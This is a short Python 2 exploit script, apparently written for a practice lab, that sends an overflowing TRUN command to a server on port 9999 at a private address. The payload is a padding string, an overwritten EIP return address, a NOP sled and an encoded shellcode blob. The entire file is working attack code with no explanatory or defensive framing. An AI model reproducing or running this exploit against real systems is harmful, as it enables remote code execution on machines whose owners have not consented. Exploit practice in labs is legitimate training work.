"""
Ryan Cheevers-Brown
Note: Needs to be ryn with python2
"""
import socket
import time

def main():
    ip = "192.168.18.29"
    port = 9999
    eip= "\xAF\x11\x50\x62"
    nops = "\x90" * 20
    buf =  b""
    buf += b"\x29\xc9\x83\xe9\xaa\xe8\xff\xff\xff\xff\xc0\x5e\x81"
    buf += b"\x76\x0e\xaa\xec\xb0\xc7\x83\xee\xfc\xe2\xf4\x56\x04"
    buf += b"\x32\xc7\xaa\xec\xd0\x4e\x4f\xdd\x70\xa3\x21\xbc\x80"
    buf += b"\x4c\xf8\xe0\x3b\x95\xbe\x67\xc2\xef\xa5\x5b\xfa\xe1"
    buf += b"\x9b\x13\x1c\xfb\xcb\x90\xb2\xeb\x8a\x2d\x7f\xca\xab"
    buf += b"\x2b\x52\x35\xf8\xbb\x3b\x95\xba\x67\xfa\xfb\x21\xa0"
    buf += b"\xa1\xbf\x49\xa4\xb1\x16\xfb\x67\xe9\xe7\xab\x3f\x3b"
    buf += b"\x8e\xb2\x0f\x8a\x8e\x21\xd8\x3b\xc6\x7c\xdd\x4f\x6b"
    buf += b"\x6b\x23\xbd\xc6\x6d\xd4\x50\xb2\x5c\xef\xcd\x3f\x91"
    buf += b"\x91\x94\xb2\x4e\xb4\x3b\x9f\x8e\xed\x63\xa1\x21\xe0"
    buf += b"\xfb\x4c\xf2\xf0\xb1\x14\x21\xe8\x3b\xc6\x7a\x65\xf4"
    buf += b"\xe3\x8e\xb7\xeb\xa6\xf3\xb6\xe1\x38\x4a\xb3\xef\x9d"
    buf += b"\x21\xfe\x5b\x4a\xf7\x84\x83\xf5\xaa\xec\xd8\xb0\xd9"
    buf += b"\xde\xef\x93\xc2\xa0\xc7\xe1\xad\x65\x58\x38\x7a\x54"
    buf += b"\x20\xc6\xaa\xec\x99\x03\xfe\xbc\xd8\xee\x2a\x87\xb0"
    buf += b"\x38\x7f\x86\xba\xaf\x6a\x44\xa2\xd3\xc2\xee\xb0\xd6"
    buf += b"\xf6\x65\x56\x97\xfa\xbc\xe0\x87\xfa\xac\xe0\xaf\x40"
    buf += b"\xe3\x6f\x27\x55\x39\x27\xad\xba\xba\xe7\xaf\x33\x49"
    buf += b"\xc4\xa6\x55\x39\x35\x07\xde\xe6\x4f\x89\xa2\x99\x5c"
    buf += b"\x2f\xcd\xec\xb0\xc7\xc0\xec\xda\xc3\xfc\xbb\xd8\xc5"
    buf += b"\x73\x24\xef\x38\x7f\x6f\x48\xc7\xd4\xda\x3b\xf1\xc0"
    buf += b"\xac\xd8\xc7\xba\xec\xb0\x91\xc0\xec\xd8\x9f\x0e\xbf"
    buf += b"\x55\x38\x7f\x7f\xe3\xad\xaa\xba\xe3\x90\xc2\xee\x69"
    buf += b"\x0f\xf5\x13\x65\x44\x52\xec\xcd\xef\xf2\x84\xb0\x87"
    buf += b"\xaa\xec\xda\xc7\xfa\x84\xbb\xe8\xa5\xdc\x4f\x12\xfd"
    buf += b"\x84\xc5\xa9\xe7\x8d\x4f\x12\xf4\xb2\x4f\xcb\x8e\xe3"
    buf += b"\x35\xb7\x55\x13\x4f\x2e\x31\x13\x4f\x38\xab\x2f\x99"
    buf += b"\x01\xdf\x2d\x73\x7c\x5a\x59\x12\x91\xc0\xec\xe3\x38"
    buf += b"\x7f\xec\xb0\xc7"
    length=2006 #Puts var EIP into EIP
    try:
        badstr = "TRUN ."+"A"*length + eip + nops + buf
        sock = socket.socket()
        sock.settimeout(3)
        sock.connect((ip,port))
        print(sock.recv(2048))
        sock.send(badstr)
        print(length)
        time.sleep(1)
        print(sock.recv(2048))
    except:
        print("It fucked up")

main()
